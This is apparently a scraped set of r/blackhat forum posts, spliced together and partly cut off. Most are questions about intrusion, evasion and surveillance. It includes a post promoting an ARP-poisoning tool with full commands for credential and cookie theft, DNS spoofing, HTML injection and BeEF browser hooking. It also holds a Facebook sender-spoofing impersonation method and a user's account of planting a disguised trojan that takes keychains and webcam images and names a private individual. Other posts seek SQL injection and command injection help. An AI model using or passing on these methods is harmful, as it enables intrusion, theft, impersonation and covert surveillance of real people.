36,myjwe,zanthius,"Hi All,

Sorry if this is not the correct place to ask.  I currently work for an ISP in Australia, we have a VoIP product on the market which we have just found out some of the devices have been provisioned with a default username and password on telnet.

We don't know which ones were provisioned incorrectly, and we have already had a few compromised (with a few hundred dollars of calls placed in a day or so).  So I'm looking for a scanner that will look for open telnet ports (I can do that using nmap easily), but then it will try the default username and password on that port and report back if it works.

Does anyone know if some software that can do so?  oh, it will have to run on linux as that's the only box we have that bypasses the corporate proxy.

Over the summer I worked at a design firm, mainly doing front-end coding for websites. I was asked to do a final job before leaving to return back to the university, was told I would be paid hourly and the check would be sent by mail. It has now been well over 4.5 months and I have not had any of my phone calls, emails, or messages returned or replied. The amount of cash is a considerable amount. I've been contemplating just taking down the single directory to gain the attention of my ""employer"", yet am not sure how to go about it. It would be a simple deletion of all the .html and .css files. I'm mainly hesitant because I cannot download the files off the server to have as a back up. I also don't want this traced back to me, ya know?

Any advice or anyone willing to lend a hand? I can provide the server information, no problem.",blackhat,1324342041,2,NA,http://www.reddit.com/r/blackhat/comments/nj6m3/built_website_but_employer_refuses_to_pay/

66,prcak,oblogic7,"My house was broken into on 11/11/11 and the morons took my iMac. It was put online for the first time today and I have the IP address. I had SSH and VNC enabled, but it appears they are behind a firewall or their router is bocking the connection. Is there anything else that I can try to gain access?

I have reported this to the officer that is investigating several burglaries in my area. Hopefully, they can do something with the info, but I don't want to wait because the computer may be taken offline in the mean time.

I would like to tie the address to a particular name or street address if possible, but mostly I would like to ensure that some sensitive files are deleted from the machine. Any help is appreciated.

EDIT: I still have an active dropbox account on the machine. This is how I knew when it came online and the IP address. I'm thinking that I could drop in a file that creates a reverse tunnel back to my house so I can get around whatever is blocking my connection. The file would have to be disguised so that they would be tricked into running it. Shouldn't be that hard since a notification pops up when a file is updated.

EDIT: I have baited my Dropbox account with a custom trojan.  When launched it will retrieve internet history for Chrome and Safari (the two browsers I had installed), grab the keychain file (in case they have stored passwords in my keychain), begins taking images every 30 seconds from the built-in iSight camera as well as desktop screenshots, and sends me an email that the file has been executed.  All of the files are saved in a hidden folder inside of my dropbox so they can be retreived.  The file copy, image capture loop, and email processes run in the background.  The launcher files are disguised as internet shortcuts and actually launch a relevant page.  Now I just move the files in and out of my Dropbox to keep the Growl notice up on the screen and wait for them to click. Hope this works.

EDIT 2: THEY TOOK THE BAIT!  However, my script-fu has failed me.  All that I recovered was the internet history from Chrome.  From digging through the 3 days or so of internet history, I have some names from Facebook profiles that have been viewed.  There is one profile in particular that appears each time immediately following the Facebook login URL.  I believe this is the person who is logging into Facebook on my iMac.  The interesting thing is that they state on their profile that they currently live in Mexico, but most of the profiles they have viewed are in my local area.  Illegal immigrant maybe?  I figured out why my script failed (forgot to run a process in the background) and have made a few changes.  I have tested and implemented a reverse SSH tunnel using an RSA key for authentication.  I am currently re-baiting the dropbox in hopes that they will execute the new version and give me full access to my machine.

EDIT: My iMac has been recovered.  Some teen had gotten it from a ""friend"" and was using it in his bedroom.  Some other stolen items were recovered as well from other burglaries.

~~The police have gotten a name and address from the IP I provided and are acting on the information in the morning.  The action they are taking is to first knock on the door and ask to come in and have a look.  If denied entry (highly likely), they will obtain a search warrant for the address.~~

~~As the last update states on my first post, the people in possession of my iMac took the bait and clicked my custom trojan and I now have the internet history from the stolen iMac.~~

~~I have sifted through the data and have figured out that Geovanni Mandujano is the person logging into Facebook.  [Link to his profile.](http://www.facebook.com/profile.php?id=100001860371836&amp;sk=info)  His images are protected.  Does anybody know a way to view the Facebook images without being his friend?  I would like to have atleast one image of him so I can compare against a mug shot that Google finds when searching his name.~~

~~If I can get an image of this guy to the police before morning, it may allow them to check for any outstanding warrants or prior arrests.  Anything that points to this guy being a repeat offender may allow them to secure a search warrant prior to the first visit.  I just don't want them to dump the iMac while the cops go back to get the warrant if denied entry.~~  Any ideas?

Not sure if this is maybe the more fun place to post this... so here we go.

I have a competitor that is stooping to some psuedo-ethical and unethical tactics to try and win clients over us. I mean I am flattered by their efforts. Some of the things that I know that they are doing:

- Calling our sales team and trying to get them to give them our internal pricing lists, sales documents, sample presentations, etc
- posting fake customer reviews about them
- posting fake customer reviews about us
- mimicking our pricing scheme
- mimicking our product offering
- slandering us while on the phone with potential clients that we are in competition with

And that's just the things that I know they are doing. So what I'm looking for are things I can do beyond our current normal PPC, SEO, Social strategies to specifically handle this particular less than honorable competitor. I've read another thread in here about someone who went on link removal campaigns against competitors.

Coming up this summer, we'll probably start walk-throughs and lectures in IRC again and most likely resurrect our forums permanently (we used to have them, I still have a copy of all the code &amp; database).

Here's the question to you guys:

1 - Anyone want to help with classes, research, and wiki maintenance?  

2 - What topics are you guys interested in us covering for our summer session this year?  

Last year we got through everything from gentoo-hardened installation, bash, etc to C programming (and its inherent vulnerabilities) and assembly; had to close a little early due to resources.  

So, what are you guys interested in learning more about?  Does anyone want to contribute further than just the reddit community?

Can someone spy on me through Home Networking feature or any other way? (I use Comodo firewall if that's relevant information. Sometimes it shows a popup with some IP that wants to connect to the network.  I'm on Ethernet cable, not Wi-Fi)

He has McAfee on his computer. It has a feature ""PC and Home Network tools"" installed. This feature says, ""Home network tools gives you a bird's eye view of computers and devices on your network and lets you fix security issues on PCs running mcAfee""

Can he look at the things I'm doing or saving on my laptop through this McAfee feature? or just check the security related issues?


**And even barring all this information, is there some way any person in a home network can spy on another computer's monitor in real-time?  How?**


**Lastly, does anyone know about this piece of advice:**

VNC to view his monitor, you'll need to install it though (on his computer), to sniff data you can use wireshark.

Theres a guide on making VNC hidden when you launch it on iron geek, i'll find the link. http://www.irongeek.com/i.php?page=videos/installvnc

If you browse around this guys site theres a link somewhere about making sure the client cant see the VNC server setup (its basically a registry hack)

The system administrators asked me what a Null Session was during the report review.  In a professional manner I explained what this is as well as the risk they bring.  Continuing through the report every finding yielded the same questions.  This gave me the idea to create a youtube channel or just security videos that can be downloaded going over such 'low hanging fruit' as null sessions and how to fix them.

I've been chatting up a classmate on Windows Live Messenger (MSN messenger), and for 2 weeks, my webcam was working fine:  It shut off after my conversation was over.

But more recently I chat with this person and notice that when my webcam was on even after i closed MSN.  When i went to the webcam settings, i noticed it was a black screen. This happens when the webcam is being used on MSN messenger, Skype or whatnot.  The webcam can only be used on once place at one time, including the  Settings Manager (where you can toggle with lighting, contrast, etc)

More strange is that even more recently, the webcam won't work AT ALL.  The webcam light will turn on if i do a video call on MSN messenger or Skype, or if i'm using the Settings Manager.  But the image is completely black.


Anyone have any idea what's going on?

Needless to say, I was caught by the second month after falling to sleep at school.

148,th5a7,[deleted],"Greetings all,

I doubt this is the best place for this, but I'm not sure where to post it.  I'm not really looking for answers so much as places to look to learn to solve this problem.

I've got an HP Elitebook 6930p that's pretty locked down.  This computer was given to my girlfriend, however she doesn't have administrator privledges.  At this point the PC is bricked for anything other than basic web surfing.

The computer is an old school computer with enterprise level security. As far as I can tell, the following security measures are in place:

* BIOS Password
* HP ProtectTools PreBoot Security
* Symantec Endpoint Protection
* HP ProtectTools drive encryption
* Traditional windows xp security
* Possible biometric/secure key security measures. (though I don't think they're in use)

I wanted to try to use Ophcrack to break into the administrator password, but I couldn't install or boot from a usb drive. I tried to defeat the BIOS password by pulling the CMOS battery, but the Pre-boot protection prevents me from getting into BIOS.  I then pulled the HDD out and was able to load into Ophcrack, but it has the usual problem of not finding any hashes in the available partitions.  I can see the HDD in the linux environment, but it can't mount the drive because it doesn't recognize the file system.  Could this be because of disk encryption?  

At this point I'm not sure where to go from here, and I'm out of my league, but I'd like to see if I can't learn a few new tricks.  We're not able to contact the school's IT department (we're out of the area and she's been gone a few years).  Am I out of luck?  There's got to be some way around all of this.

**Edit: Thanks for the replies. I already pulled the CMOS... I still have to contend with the pre-boot protection.**

151,tq7uh,[deleted],"Wasn't relevent to /r/asknetsec so thought i'd ask here, especially as here views security from the ""break stuff"" perspective.

...well.

So i was thinking about Rootkits (from a victims perspective) and I was wondering if there was/how you would go about making, a similar program to [Prey](http://preyproject.com/) or maybe, even DIY with a utility.

I was wondering (creative paranoia) if you could use a liveCD to image a 'victims' Windows HD if you had physical access to it for a unlimited amount of time (i.e. not a factor) and then install a bootloader (?) utility that mounted that image and booted up windows as usual, but was able (from the actual root not the booted images 'virtual' root - correct terminology?) to log things the hardware did like network logs (grabbing clear txt like wireshark may be too much to ask (?), but grabbing all IP's visited would be very useful) and recording keystrokes, to be sent to a server at regular intervals.

The bootloader after POST would have to appear as it would do regularly on the prior windows boot-up. Hows that shape up? Easy for a hacker to throw together?

This is partly what the [Prey](http://panel.preyproject.com/login) software does as anti-theft. It can send hardware data like camera shots, which is good, but no keylogging. It does geo-location, which for most computers could only be done by the IP (or possibly attempting by WiGLE to be creative, but what computer has built-in GPS except phones...) so maybe it logs all IP traffic which is a start. But this is an incomplete picture.

So does a more offensive/blackhat equivalent of prey exist?

I have some understanding of hardware, tcp/ip, so i can probably keep up with explanations that don't involve programming, but go easy on me if i got the above idea wrong, newbie steps, from a hypothetical interest.

Edit: Let me clarify, the bootloader, and the 'hostile' OS (that will spy on and boot the 'victim' image) is beyond my understanding from a technical (kernel/shell/apps that would virtualise/mount the 'victim' OS). So i'm interested in knowing how feasible it is to create, or if in fact their is an *existing* tool publically available (commercial, FOSS, or otherwise).",blackhat,1337188881,2,NA,http://www.reddit.com/r/blackhat/comments/tq7uh/heres_an_idea_not_netsec_but_physical_in_access/

* I live in a house with 10 other students. I am the oldest, landlord is female so I am usually in-charge of most of the technical aspects in the house.

* Wifi connection is shared. The internet router is D-Link DCM-604. 
WPA/WPA2 Encryption (TKIP + AES). Everyone in the house knows the wifi password. Only I know the router admin password.

* One kid decided to block all others internet connection, leaving only him and his roommate so they can play MMO lag-free. I don't know which hack tool he uses or how did he does that. I only overheard him talking to his friend that he is locking others so he can play

* I checked the router settings, nothing changed, nothing in the port filtering/IP address filtering/MAC address filtering sections. Only I knows the password so I don't think he accessed the router settings. I also tried resetting the router and changed the router password but it does not work.

* Every PC can connect to the wifi and locally, just not the internet. Sometimes I can ping external website (google.com), sometimes I can not.


So my questions are:

* How did he do that? OR What hack tool did he used?

* How to prevent and counter?


I do not want to expose him to the landlord yet. He is just a kid, I want to get more proof and confront him first.

186,vp3fw,sacredsock,"Hey all, 

so I originally tried to post this as a direct link but for some reason reddit wouldn't accept it (??), I'm thinking it pegged me as a spammer seeing as my usernames in the URL. (yes, this is a shameless post to a blog I'd just created).

Anyway, I'll just post it like this then. Here's [the original](http://sacredsocks.blogspot.com/2012/06/hello-void-this-is-first-post-on-my-new.html) if anyone wants it.

**TL;DR: Send an email to your friends @facebook address but set the From address to the address that's been linked to another users Facebook account (eg. their primary email address). Profit.**

&gt; Hello Void,

&gt; This is the first post on my new blog - this might be a once off thing, we'll have to see, for now though I want to share something fun that I came across today. I'm not sure whether this is public knowledge or not but I had so much fun finding it out today that I just have to share.

&gt; Be warned though, this is for educational (cough) purposes only and I take no responsibility for what you do with it. So with that out the way, let's get on to the good stuff!

&gt; I stumbled upon a nifty little undocumented software feature of Facebook's email system today. (You know, the one that they've recently forced upon all their users with out permission? Yeah, that one). This feature allows you; as the naughty little shit that you are; to impersonate another user on facebook and send messages to people using their name. No hacking passwords or stealing cookies required.

&gt; How does it work? Well Facebook allows you to send an email from your normal email account to any of their user's Facebook email address and it will pitch up in their message feed. The recipients Facebook email address is essentially [the URI of their account page]@facebook.com -- so for example, because my FB profile sits at http://www.facebook.com/john.doe, my email address is set to john.doe@facebook.com. This is email account is non-negotiable. All FB accounts have them. You can choose to not list the address on your profile but that doesn't really offer much protection seeing as the email address is literally staring at you from your browsers address bar when you view their profile.

&gt; You can send an email from a normal email account to a FB email account (that's a @facebook.com email address) if, and only if, the email address that you're sending from is tied to a FB profile that already exists. That was a mouth full so let's go over it slower.

&gt; When Facebook receives an email for one of it's users, it first checks for an account that is tied to the sender's address. If it doesn't find one, it throws the email out and doesn't deliver it. If it does find one, it happily adds it to the recipients message queue and marks it as coming from the account that it found a match for.

&gt; So what's the big fucken deal? Well, email is notoriously easy to fake. With only a smidgen of programming skill, I can send you a message to your Facebook email address and have Facebook think that it's coming from your mom. It'll put it in your message queue for me and even put her profile picture next to it. Viola, instant Troll bait! :D Cool huh?

&gt;There is a catch though, I need to know at least one email address associated with your mom's facebook account.

&gt; ""Wait a second, didn't you just say that facebook had issued everyone with their own Facebook email adress, whether they wanted one or not, and tied it to their account? Can't we just use that?""

&gt; Dear God, how much I wish that were true. In fact, when I made this discovery today, I nearly jizzed my pants just thinking about it. Alas it was not to be. It seems that the brainiacs at Facebook have actually thought of this. Setting the From email address to the FB email address of the person you are wanting to impersonate doesn't work. It has to be an actual email address. Most likely this is because Facebook doesn't actually accept incoming emails from @facebook addresses. Or maybe you can use them and I just haven't been able to get it working. Luckily for me, most of my friends have gmail accounts and most of them used said gmail accounts to create their profiles originally so they were easy enough to guess and by extension, impersonate.

&gt; Now there are two draw backs to would be trolls and spammers. Firstly, FB obviously knows that there's a vulnerability here so they put a nice little ""Unable to confirm identity"" icon next to the message. I'm guessing there might be ways around this (ie. IP address from the email matches the IP address from the domain) but I haven't really looked into it yet.

&gt; Last draw back is, if your target replies to one of your fake emails, Facebook will send it back as an email to the from address that was attached to the original email. This might not be a bad thing though. For example, if you've managed to hack someone's email account, it also allows you to gain some control over their Facebook identity. However, if you're just faking the from address in emails then you'll be having some pretty one sided conversations.

&gt; So yeah, hope you enjoyed the read and that's it from me. If you have any questions ask Google... or your mom.

**Update**

For those saying that the vuln has been fixed: it's still working fine from my side so make sure that you're From address is set to the primary email address for the account of the person you want to impersonate. 

For those you don't have a smtp server to play around with, you can use something like Hoax Mail to try the vuln out (using oneoffemail.com will allow you to create an account on HM without using your actual email address). Unfortunately HM puts a stupid footer into the email unless you pay a subscription fee.

I was originally going to post some PHP code but then I realised that anyone who actually had a PHP server already installed and set up probably wouldn't need a code example so I'm not going to bother. If you do want it however, give me a shout.

223,xgf3s,dkcph,"There are only a few thing as annoying as cybersquatting. You were stupid and forgot to renew a domain and some jerk buys it and lets it rotten while demanding that you pay $10.000 to get it back.

The following post assumes that the domain you want is special to only you, and nobody else want it.

These parked pages always contain some form you can fill in order to get in touch with the owner. However, I just realized that in order to sell the domain and make a profit these forms are actually working and monitored. This makes it possible to spam the owner with request for the domain.

Since I imagine they only sell a tiny fraction of these domains I can't imagine that they are willing to spend a lot of time/money on a random domain.

Therefore, if you write a small script which posts a semilegit request once or twice a day for a single domain this domain becomes a very high maintenance domain in order to filter out all your spam. This makes the domain expensive to monetize and thereby looses it value.

Of course they now know that someone want it, but if they at the same time are convinced that you never in a million years are going to pay for it the only reasonable thing to do is to let it go. Unless they keep it just to piss you off :)

Does a tool like this already exist? And in case it doesn't, what do you think about the idea?

I personally thought about it because I really would like a domain back I lost 5 years ago. Until now I have played the waiting game without any luck.

**NB** Currently non of the big parking providers do any anti spam prevention (like CAPTCHAS) and I have no idea why. I realize this could change, but I question if it will unless this spamming approach would be a big problem for their customers.

1\. DllRegisterServer

2\. **DllUnregisterServer**

3\. DllCanUnloadNow

4\. **DllGetClassObject**

**DllUnregisterServer** is a nice way to discretely remove a legitimate Add-In without user interaction, allowing you to masquerade as the true add-in in its place.

**DllGetClassObject** has me salivating, of course, because if I could get an instance of the product then it would be possible to invoke any of the methods of the legitimate Add-In.

I've been working on a fuzzer in C++, I'm going to convert it into a Python library that would help create fuzzers rapidly. So far it's fairly stable and I just need to improve the packet creation to be more dynamic and on data generation for the fuzzer. Here's a link to the code: http://bitbucket.org/vorbis/shiva. I'm looking for users and contributers. Check it out and submit bug reports and if you're interested in contributing please comment or message me! I'd like to make this an ongoing project, so give me your input.

It's cleaner and just as effective. I'm almost done porting it. I think the debugging portions I may do in C, though. Haven't made up my mind yet.

Edit 2: Ok, finished porting most of the code over. New repository, https://bitbucket.org/vorbis/python-shiva. I have yet to implement any debugging into it and the data generation is still remedial. If anyone is interested in contributing, it's ready for developers now. :)

Hi /r/blackhat ! I'm posting in hopes that someone can point me in a direction for my current project. A couple compsci buddies and I are looking to ""augment"" our campus internet speeds. Obviously we're not experts but we are willing to learn and research the problem. Our limited knowledge of the campus network (small liberal arts, about 2,00 0 students) says that the bandwidth allocation is done by a ""leaky bucket"" program? Basically once our 155mb downstream is maxed, all active IPs are subjected to this system where you get the initial speed of the bucket, but once you fill it you are significantly throttled.
As for work-arounds, the title sums up our current strategies. The IP cycling sounded nice because it isn't rly that ""wrong"" however it doesnt really solve the issue of filling the bucket when downloading large files. Not to mention the delay in constantly pulling a new IP assignment from the campus DNS. So maybe NIC spoofing? Figure out the IP range for our dorm's VLAN, take attendance of currently assigned IPs thenh grab a bunch of open ones and assign them all to one box? If there are other known approaches I'm all ears. I also have limited access to campus networking staff and can indirectly ask more advanced/relevant questions. Thanks!!!

&gt;""Today's computers, like a Turing machine, work by manipulating bits that exist in one of two states: a 0 or a 1. Quantum computers aren't limited to two states; they encode information as quantum bits, or qubits, which can exist in superposition. Qubits represent atoms, ions, photons or electrons and their respective control devices that are working together to act as computer memory and a processor. Because a quantum computer can contain these multiple states simultaneously, it has the potential to be millions of times more powerful than today's most powerful supercomputers.""

&gt;""This superposition of qubits is what gives quantum computers their inherent parallelism. According to physicist David Deutsch, this parallelism allows a quantum computer to work on a million computations at once, while your desktop PC works on one. A 30-qubit quantum computer would equal the processing power of a conventional computer that could run at 10 teraflops (trillions of floating-point operations per second). Today's typical desktop computers run at speeds measured in gigaflops (billions of floating-point operations per second).""

**Here is a brief overview of their method of quantum computation:**

**Here is a list of D-Wave's peer reviewed publications:**

**They have also raised 30 million in funding:**

As the above article states both the CIA and NSA have an active interest in this technology for obvious reasons.



I realize this is not only relying on the assumption D-Wave has accomplished what they claim but quite a complex field and requires extensive study for proper conversation. My question is this, assuming D-Wave makes progress in their attempts and the general field of quantum physics advances (http://www.newscientist.com/article/dn22336) shouldn't we who want to keep our data private start mitigation strategies now?

I just read [this article](http://www.wired.com/threatlevel/2012/10/dkim-vulnerability-widespread/2/), which talks about how many companies, even large ones, had DKIM keys that were too small, and thus insecure.

I work as an assistant technology support specialist at my school, and I have a great suspicion that my school district probably does not have a sufficiently large DKIM key (much of the software that they're still using has been discontinued because it's so old).

I would like to check whether my district's DKIM key is indeed secure, and if it is not, I'd like to notify them of the vulnerability (perhaps after  cracking the key and pulling a small prank on my boss).

I have a general idea of what I would have to do, but could someone direct me to resources to get me started in the right direction?",blackhat,1351130376,1,NA,http://www.reddit.com/r/blackhat/comments/121jn1/finding_dkim_info_for_a_domain/

I'm trying to analyze an unknown filetype and I'm having a little trouble knowing what to do next.

A url to a zip file was found in a JSON request while sniffing an iPhone app's network traffic. I downloaded the zip file and extracted its contents. There are a series of folders all containing files with the extension of '.yves'. What this zip folder is supposed to be is the ASV translation of the Bible and I suspect each of these files is a specific chapter.

Here's what I've found out thus far:

'file -I *.yves' ==&gt; 'application/octet-stream; charset=binary' 

'file *.yves' == &gt; 'DOS executable (COM)'

I find it strange that this is supposedly a DOS executable when all that it should be in the end is just some plain text. 

What should I try next? I have uploaded the zip file in hopes that someone on here would enjoy a small challenge.

304,13o2xh,[deleted],"Short of places to ask, so thought I would try here. Imagine having a source of immensely valuable data for which the general public would be very greatful, however the data is of a time sensitive nature, and the originator of the data would be rather unhappy it was being distributed for free.

So basically, imagine a desire to warez streaming data. My question is how to implement such a system. Clearly tor would explode with even a handful of subscribers, and besides, the latency on tor is often more than 30 seconds, which is beyond my constraints.

What psuedoanonymous distribution alternatives exist? My only scheme is to employ some kind of home-grown P2P, such that:

 * One or more core machines listen on tor for HTTP requests.
 * Each machine maintains a database of ""level 1"" nodes. If this database is under some desired size, request the (custom) client to ping a designated UDP dest host/port, causing a NAT mapping to be created (in the style of samy.pl).
 * Core machine would then spoof a packet containing a cookie from this host/port to the client's IP address. If the client reproduces the cookie, it gets added to the database and becomes a 'level 1' node. Streaming data is then emitted via UDP spoofing to this node. Client would maintain a tor connection to the server to deliver pings, connection counts, and requests for ranges of lost frames.

 * If core machine gets a new client and already contains level 1 DB entries with low connection counts, simply pass IP address of some randomly selected L1 node to the connecting client.

In this way a very shallow 'ring' is formed behind a totally hidden data source, that relies on spoofing rather than Tor to hide its location. Obviously with extraordinary effort the source could be located, but various tricks could be employed to make this search harder, and fruitless if successful.

The scheme could be extended in various ways to cope with scale â€“ for example introducing a level 2 node. Keeping a shallow (and therefore reasonably low latency) tree structure would allow deployment of my hypothetical data stream to a potentially large number of clients.
 
Does anything like this exist already? Any better ideas? Key requirements: data source is totally protected, latency is low.",blackhat,1353682930,13,NA,http://www.reddit.com/r/blackhat/comments/13o2xh/ask_blackhat_anonymously_streaming_data/

Trying to create a POC for BisionFTP v3.5 on my virtual machine. I created a POC sending 1600 \x41s to BisonFTP and that gave me what I wanted (EIP/EBP were overwritten). However, when I ran the same POC again I received totally different behavior. The app still crashes and gives me Access Violation errors but no longer are EIP/EBP overwritten. I understand Windows XP does not implement ASLR so I was hoping you guys can provide insight on why you think this would be happening and how to mitigate this. Thanks!

TLDR: Why would the same POC work once and fail to overwrite EIP the second time?",blackhat,1360873742,1,NA,http://www.reddit.com/r/blackhat/comments/18jatn/question_buffer_overflow_poc/

357,19r635,isdgisdjgdsg,"So I have some vulnerable PHP code that looks like this verbatim. Backend is MySQL.

    $select = 'SELECT * from table where id = ' . $_GET['remove'];
    $result = mysql_fetch_row(mysql_query($select));
    mysql_query('DELETE from table where id = ' . $_GET['remove']);

$result isn't used at all (I have no idea why it was in there in the first place); the purpose is to delete a row with a certain ID. Unfortunately, sqlmap seems unable to exploit this. In its detection phase, if I pass it an ID (remove=5 for example) that exists, the row with that ID will be deleted and so following requests will fail, because sqlmap seems to solely use ` AND SLEEP(5)`, and since the first part of the conditional is false, it never reaches the right-hand side of the `AND`. I've tested `remove=1 AND SLEEP(5)` (where 1 is a valid id), as well as `remove=88 OR SLEEP(5)` (where 88 is non-existent). I don't particularly care if I end up deleting all the rows from the table; I'd just like to be able to extract data.

Could someone describe an algorithm that could work here? I'd be willing to write my own script but I don't know all the ins and outs of MySQL.

Is there perhaps a way to retrieve valid data, but have the script error out/stop before reaching the DELETE clause, somehow? Or is there something else that can be done?

So here is the thing. There is a new system in my country with an External testing which is very stupid because our professors made tests and kept notes of us the whole year so just in the end the government can make random tests and put the grades that are on their tests. Therefore the notes and tests from the professors don't even matter, but they worked so hard the whole year. Basically means that their whole work just went down the river.

So, I contacted IronKey support, and they said that I cannot decrypt my backup file--*even though I know the password to decrypt the files*. They said I'd have to purchase another Ironkey of equal or larger size, then restore the backup to that key, then I could have my files.

I no longer have a need for an IronKey, so I don't want to do that. Does anybody know how to break that encryption given that I know the password?

442,1mbzty,e76,"I can't figure out how this happened. I wouldn't be quick to blame Chase or 1Password for this as there were a lot of variables involved.

I was using 1Password on my iOS device. They now have a browser built into the app that allows you to autofill your credentials and what not. I went to Chase.com and got redirected to m.chase.com and logged in, just as I've done dozens of times before. This time, however, I got redirected to a long URL with random letters and numbers, which re-redirected me a few times before taking me to the app Candy Crush in the app store.

Some googling around for ""Candy Crush"" and ""ad redirect"" informed me that a particular ad network is allowing clients to inject JS into their ads. Good explanation right there, except that  Chase mobile shouldn't be serving ads from an ad network. I even fired up a network sniffer and did this whole thing again and I didn't see any requests to any external websites, let alone any ad networks. In fact, I haven't been able to reproduce this problem since.

I was on my own private wifi network when this happened, so I'd like to think I can rule out man in the middle attacks. Does anybody have any theories as to how this happened? Perhaps js was somehow injected into a cookie or session variable or something?

See the matter is I need this account deleted because it's the last reminants of the game. And technically he cannot be keeping my personal information on this account that's why it's wrong. Every game you can create an account and delete who's to say this game is any different the same rules apply to any game and I'm calling this unconsitutional he cannot hold my personal information. Just because he acted like a complete dumbass and banned should not give him a reason to prevent me from deleting the account, this should be illegal.

And lastly I urge you to NOT vote this down because I'm doing the right thing by getting this account deleted, please vote it UP so it gets notice.

Let the script identify the most active users on your LAN and see usernames, passwords, and messages a target on your LAN sends or receives. Steal their cookies. Inject arbitrary HTML into pages they visit. Hook their browser with BEeF and send them a fake flash update to download whatever payload you want. Take total control or silently watch their every move, or hell, both. This is a multithreaded, asynchronous packet parsing/injecting ARP poisoner.  

    git pull https://github.com/DanMcInerney/LANs.py
    cd LANs.py/


**Simple usage:**

http://i.imgur.com/Qlo7EoI.png

    python LANs.py -u -n

    -u: print URLs the victim visits (minus output spamming image and css URLs)
    -n: perform a fast port scan of the target

The lack of the -ip option means the script will display all the machines currently connected to the network along with how many data packets theyâ€™re sending so you can target the most active machines.  


**Throw the -p option in there:**

http://i.imgur.com/kQofTYP.png

    python LANs.py -u -p

and you can now see packet loads they send to other servers, HTTP/IRC/IMAP/POP/FTP username/passwords along with incoming/outgoing email and IRC messages, and any search they make on any nonSSL site (WebMD anyone?). Itâ€™ll even decode base64 encrypted IMAP/POP authentications if their email server encrypts them that way.  


**Now letâ€™s get a little more aggressive:**

http://i.imgur.com/PwzUYcY.png?1

    python LANs.py -u -p -n -na -dns neopets.com -set -d -ip 10.0.1.20

    -u: print URLs visited
    -p: print usernames, passwords, messages, and searches made
    -n: perform a fast and simple port scan prior to catching their packets
    -na: perform a very aggressive Nmap scan of their network in the background and save output to file
    -dns DOMAIN: DNS spoof that domain including any subdomains. Especially powerful when combined with -set. Output is much cleaner now, btw, doesnâ€™t repeat itself as much
    -set: launch the Social Engineerâ€™s Toolkit; can clone sites and harvest credentials or create executable payloads to deliver to the target
    -d: launch driftnet to see all the images theyâ€™re viewing
    -ip: target this domain; skips the active user targeting at the beginning of the script  


**Thatâ€™s all well and good but letâ€™s really start messing with the target:**

http://i.imgur.com/JPMfJ5M.png

    python LANs.py -c â€˜&lt;title&gt;OWNED&lt;/title&gt;â€™ -ip 10.0.1.20

    -c â€˜htmlcodehereâ€™: inject arbitrary HTML. Include the quotes.


First tries inserting your HTML after the first &lt;head&gt; and failing that, inserts it before the first &lt;/head&gt;. Send them secret messages in the body of the pages they view, inject your own javascript, or redesign the entire page with CSS  


**Extra fun: hook their browser with the Browser Exploitation Framework**

http://i.imgur.com/tofuhWS.png

http://i.imgur.com/PPsI2wZ.png

    python LANs.py -b http://10.0.0.5:3000/hook.js -ip 10.0.0.8

    -b http://beefhookurl: inject the BEeF javascript hook into pages they visit

This one is super fun since you can send them pop ups, fake update notices, redirect their browser, and a thousand other things. Just go to the BEeF control panel as seen in the second picture, then go to commands and start playing around. The commands &gt; social engineering category has some great templates for harvesting Gmail and Facebook credentials.


HTML injection at the packet level is not an easy task. There are many many variables that can go wrong and should any tiny thing go wrong the browser will probably not load the page theyâ€™re trying to view or itâ€™ll just load a part of it and theyâ€™ll know somethingâ€™s up. This script is designed for stealth so should it detect anything wrong it will simply forward the packets as is. This means it doesnâ€™t inject HTML/BEeF hooks in every single HTML packet the target receives; that would be bad. It would slow them down and be obvious so let the target browse to a small handful of sites and usually theyâ€™ll be hooked within 1-3 pages. Twitter widgets, disqus comments, and facebook scripts are everywhere and make for excellent hook vectors. Thanks to /u/levle for help and ideas.

483,1qviih,Nairb131,"I am in a network security class and we are almost in phase three of a project which we will be required to compromise the other users machines.

We found a vulnerability that the professor installed in the stock website that the other team has to have access to that would allow a Directory Traveral. Here is the code:

http://pastie.org/8488774

The filename is a text box that a user inputs it into and the $tool is just a dropdown menu with three values that do nothing except tell it where to redirect to.

I realize this code can only be used to view the contents of a file at the moment i.e. ../../../../../etc/passwd to view the passwd file.

My question is if there is any way to use backspaces to get rid of the $fullpath and the cat command and run a file with another command to gain access to their machine. I have tried `\b, . chr(8), '&amp;#8;'` and %08 to issue a backspace command and negate the cat command but to no avail.

Is there any way to encode it that would make this work?

EDIT: Not really looking for a super lot of help just if what I am trying is possible and maybe what type of encoded characters can work in this way.

Here is what the website looks like. I think one of my problems might be that it is a textbox.

509,1vlj1p,[deleted],"The IronHeart Security DDoS/DoS Mitigation System, otherwise known as the IHSDMS, is a client based, first-response, attack mitigation system. It works using a trust/time interval system that allows for quick mitigation of any and all connection-based attacks. In addition to attack prevention and mitigation, the IHSDMS does not disconnect all users during attacks. In fact, it allows users to keep browsing the site as the attack is going on. Though the IHSDMS is currently only in version 1.5 (beta), it is still an effective first-response tool and will soon enough become a full-blown mitigation and prevention system.

Currently, the IHSDMS is in beta testing step 1 -- site stability and accessibility. As a beta tester for the step 1 testing period, your job will be to report any bugs or issues you see/notice with the system, whether they be small or big, anything you notice should be reported. In addition to the pride of being one of the few who get early access to this system, as a beta tester you will receive the full system 100% free as well as any and all future updates 100% free.

* How do I hack my university?
* A day in the life of a blackhat?

Or spammy posts will be deleted. Ideal posts on this subreddit are tutorials, original research and tools (your crappy ARP poisoner will be deleted), and well thought out questions/answers.

Our updated rules:

* Be excellent to each other.
* Stay on topic.
* Avoid self-incriminating posts.
* Pick a good title.
* Do not post non-technical articles.
* Ideally, the content should be original, we don't care about your crappy ARP poisoner or Kapersky's latest scam.
* No pay / signup walls.
* Well thought out and researched questions / answers only.
* If your project is not free / open source it does not belong.
* Please limit your posts (we don't want to read your blog three times a week).

Thanks,

First of all go to http://jsbeautifier.org/ and ""beautify"" it for better understanding.

My guesses so far are that the script adds automatic likes and subscribes to people based on the functions *a(abone)*, *P(post)* and *Like(p)*  (not 100% sure though).

The most obfuscated piece of code comes at the *rkadaslari_al(id)* function, where at the end it calls another obfuscated function *yorum_yap(id, mesaj)*...

Still trying to figure out... any guesses? where could this be embedded? wouldn't facebook itself have a way to block the automatic petitions from this?

569,20j69p,pjvex,"I have a Thomson (or Technicolor) router from TWC.  It is a router with VoIP (although I don't use it for VoIP -- it was just cheaper that way).

My problem is that **I don't want to use my ISP's DNS servers.**  It is driving me mad.  Not only is this some very strange router (model number is DWG875-X), I think TWC flashed their own firmware.

